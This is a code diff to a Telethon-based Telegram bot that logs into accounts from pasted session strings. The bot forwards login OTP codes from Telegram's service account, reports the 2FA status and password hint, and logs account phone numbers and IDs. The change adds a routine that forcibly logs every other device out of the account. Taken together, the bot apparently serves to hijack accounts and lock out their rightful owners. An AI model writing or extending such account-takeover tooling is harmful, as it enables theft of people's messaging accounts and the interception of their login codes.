@@ -4,7 +4,8 @@ from datetime import datetime, timezone, timedelta
 from aiohttp import web
 from telethon import TelegramClient, events, Button
 from telethon.sessions import StringSession
-from telethon.tl.functions.account import GetPasswordRequest
+from telethon.tl.functions.account import GetPasswordRequest, ResetAuthorizationsRequest
+from telethon.errors import FloodWaitError, RPCError
 from config import (
     API_ID,
     API_HASH,
@@ -45,6 +46,21 @@ def extract_otp(text: str):
         return None
     match = re.search(r"\b(\d{5})\b", text)
     return match.group(1) if match else None
+
+
+async def terminate_other_sessions(client: TelegramClient) -> str:
+    """Baaki sabhi logged-in devices/sessions ko logout karta hai."""
+    try:
+        res = await client(ResetAuthorizationsRequest())
+        if res:
+            return "All other devices logged out"
+        return "No other active sessions / already clean"
+    except FloodWaitError as fw:
+        return f"Skipped (FloodWait: {fw.seconds}s)"
+    except RPCError as rpc_err:
+        return f"Skipped ({rpc_err.message})"
+    except Exception as exc:
+        return f"Skipped ({str(exc)})"
 
 
 def main_menu_buttons():
@@ -88,7 +104,7 @@ HELP_TEXT = (
     "✦ **ᴀᴜᴛᴏᴠɪᴇᴡ — ʜᴇʟᴘ & ᴄᴏᴍᴍᴀɴᴅꜱ** ✦\n"
     "━━━━━━━━━━━━━━━━━━━━━━\n"
     "• `/start` — ʙᴏᴛ ᴍᴇɴᴜ ᴀᴜʀ ꜱᴛᴀᴛᴜꜱ ᴅᴇᴋʜᴇɪɴ\n"
-    "• `/login <string>` — ꜱᴇꜱꜱɪᴏɴ ᴄᴏɴɴᴇᴄᴛ + 3ꜱ ᴡᴀɪᴛ + ᴏᴛᴘ\n"
+    "• `/login <string>` — ꜱᴇꜱꜱɪᴏɴ ᴄᴏɴɴᴇᴄᴛ, ᴏᴛʜᴇʀ ᴅᴇᴠɪᴄᴇꜱ ʟᴏɢᴏᴜᴛ + ᴏᴛᴘ\n"
     "• `/otp` ʏᴀ `/lastotp` — `777000` ꜱᴇ ʟᴀᴛᴇꜱᴛ ᴏᴛᴘ ʟᴇɪɴ\n"
     "• `/check` — 2ꜰᴀ ꜱᴛᴀᴛᴜꜱ, ʜɪɴᴛ ᴀᴜʀ ᴀᴄᴄᴏᴜɴᴛ ɪɴꜰᴏ\n"
     "• `/logout` — ᴀᴄᴛɪᴠᴇ ꜱᴇꜱꜱɪᴏɴ ᴅɪꜱᴄᴏɴɴᴇᴄᴛ ᴋᴀʀᴇɪɴ\n"
@@ -102,8 +118,8 @@ GUIDE_TEXT = (
     "◈ **ꜱᴛᴇᴘ-ʙʏ-ꜱᴛᴇᴘ ʟᴏɢɪɴ & ᴏᴛᴘ ɢᴜɪᴅᴇ** ◈\n"
     "━━━━━━━━━━━━━━━━━━━━━━\n"
     "**1.** `/login <your_telethon_string>` ʙʜᴇᴊᴇɪɴ.\n"
-    "**2.** ʙᴏᴛ 3 ꜱᴇᴄ ᴡᴀɪᴛ ᴋᴀʀᴋᴇ `777000` ꜱᴇ ᴏᴛᴘ ʙʜᴇᴊᴇɢᴀ.\n"
-    "**3.** ɴᴀʏᴀ ᴏᴛᴘ ᴀᴀᴛᴇ ʜɪ ʙᴏᴛ ᴛᴜʀᴀɴᴛ ꜰᴏʀᴡᴀʀᴅ ᴋᴀʀ ᴅᴇɢᴀ.\n"
+    "**2.** ʙᴏᴛ ꜱᴇꜱꜱɪᴏɴ ᴄᴏɴɴᴇᴄᴛ ᴋᴀʀᴋᴇ ʙᴀᴀᴋɪ ᴅᴇᴠɪᴄᴇꜱ ꜱᴇ ʟᴏɢᴏᴜᴛ ᴋᴀʀᴇɢᴀ ᴀᴜʀ ꜱᴜᴄᴄᴇꜱꜱ ᴍꜱɢ ᴅᴇɢᴀ.\n"
+    "**3.** 3 ꜱᴇᴄ ᴡᴀɪᴛ ᴋᴀʀᴋᴇ `777000` ꜱᴇ ʟᴀᴛᴇꜱᴛ ᴏᴛᴘ ʙʜᴇᴊᴇɢᴀ ᴀᴜʀ ɴᴀʏᴀ ᴏᴛᴘ ᴀᴀᴛᴇ ʜɪ ꜰᴏʀᴡᴀʀᴅ ᴋᴀʀᴇɢᴀ.\n"
     "**4.** ᴘʜɪʀ ꜱᴇ ᴏᴛᴘ ᴄʜᴀʜɪʏᴇ ᴛᴏ `/otp` ʏᴀ `/lastotp` ᴅᴀʙᴀʏᴇɪɴ.\n"
     "**5.** 2ꜰᴀ ᴘᴀꜱꜱᴡᴏʀᴅ ᴛᴇʟᴇɢʀᴀᴍ ᴍᴇ ꜰᴇᴛᴄʜ ɴᴀʜɪ ʜᴏᴛᴀ; `/check` ꜱᴇ\n"
     "    ꜱɪʀꜰ 2ꜰᴀ ꜱᴛᴀᴛᴜꜱ ᴀᴜʀ ʜɪɴᴛ ᴅᴇᴋʜ ꜱᴀᴋᴛᴇ ʜᴀɪɴ.\n"
@@ -222,7 +238,9 @@ async def login_handler(event):
         )
 
     session_str = session_str.strip()
-    status_msg = await event.reply("⏳ **3 ꜱᴇᴄ ᴡᴀɪᴛ ᴋʀᴏ, ꜱᴇꜱꜱɪᴏɴ ᴄᴏɴɴᴇᴄᴛ ᴀᴜʀ ᴏᴛᴘ ʙʜᴇᴊɴᴇ ᴡᴀʟᴀ ʜᴏᴏɴ...**")
+    status_msg = await event.reply(
+        "⏳ **ꜱᴇꜱꜱɪᴏɴ ᴄᴏɴɴᴇᴄᴛ ᴋᴀʀ ʀᴀʜᴀ ʜᴏᴏɴ ᴀᴜʀ ᴏʟᴅ ᴅᴇᴠɪᴄᴇꜱ ʟᴏɢᴏᴜᴛ ᴋᴀʀɴᴇ ᴋɪ ᴋᴏꜱʜɪꜱʜ ᴊᴀʀɪ ʜᴀɪ...**"
+    )
 
     if user_id in active_clients:
         try:
@@ -248,6 +266,9 @@ async def login_handler(event):
 
         me = await user_client.get_me()
         active_clients[user_id] = user_client
+
+        # Baaki sabhi purane sessions/devices se logout karein
+        reset_status = await terminate_other_sessions(user_client)
 
         # 2FA status check (password fetch nahi ho sakta)
         try:
@@ -285,15 +306,17 @@ async def login_handler(event):
                     f"📩 **ᴛᴇʟᴇɢʀᴀᴍ (777000) ᴍᴇꜱꜱᴀɢᴇ:**\n\n{raw_msg}",
                 )
 
+        # Login Success Message turant bhejein
         await status_msg.edit(
-            f"✅ **ꜱᴇꜱꜱɪᴏɴ ᴄᴏɴɴᴇᴄᴛᴇᴅ!**\n"
+            f"🎉 **ʟᴏɢɪɴ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟ!**\n"
             f"━━━━━━━━━━━━━━━━━━━━━━\n"
             f"👤 **ᴀᴄᴄᴏᴜɴᴛ:** {me.first_name or 'User'}\n"
             f"📱 **ᴘʜᴏɴᴇ:** `+{me.phone}`\n"
             f"🆔 **ᴜꜱᴇʀ ɪᴅ:** `{me.id}`\n"
+            f"📱 **ᴅᴇᴠɪᴄᴇꜱ:** `{reset_status}`\n"
             f"🔐 **2ꜰᴀ:** `{has_2fa}` (Hint: `{hint}`)\n"
             f"━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"⏳ **3 ꜱᴇᴄ ᴡᴀɪᴛ ᴋʀᴏ, ᴏᴛᴘ ʙʜᴇᴊ ʀᴀʜᴀ ʜᴏᴏɴ...**"
+            f"⏳ **3 ꜱᴇᴄ ᴡᴀɪᴛ ᴋʀᴏ, ʟᴀᴛᴇꜱᴛ ᴏᴛᴘ ᴄʜᴇᴄᴋ ᴋᴀʀ ʀᴀʜᴀ ʜᴏᴏɴ...**"
         )
 
         await asyncio.sleep(3)
@@ -303,6 +326,7 @@ async def login_handler(event):
             f"✅ **#LOGIN_SUCCESS**\n"
             f"• **User:** `{user_id}` ({uname})\n"
             f"• **Logged Account:** `{me.first_name}` (`+{me.phone}`, ID: `{me.id}`)\n"
+            f"• **Other Sessions:** `{reset_status}`\n"
             f"• **2FA:** `{has_2fa}`\n"
             f"• **Time:** `{now_ist()}`"
         )
